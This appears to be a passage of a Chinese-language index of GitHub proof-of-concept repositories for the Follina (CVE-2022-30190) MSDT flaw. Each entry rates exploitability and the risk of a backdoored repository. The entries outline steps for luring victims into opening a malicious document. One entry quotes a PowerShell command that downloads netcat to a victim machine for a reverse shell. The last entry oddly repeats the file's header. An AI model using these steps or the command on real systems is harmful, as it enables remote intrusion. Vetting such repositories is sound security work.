    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

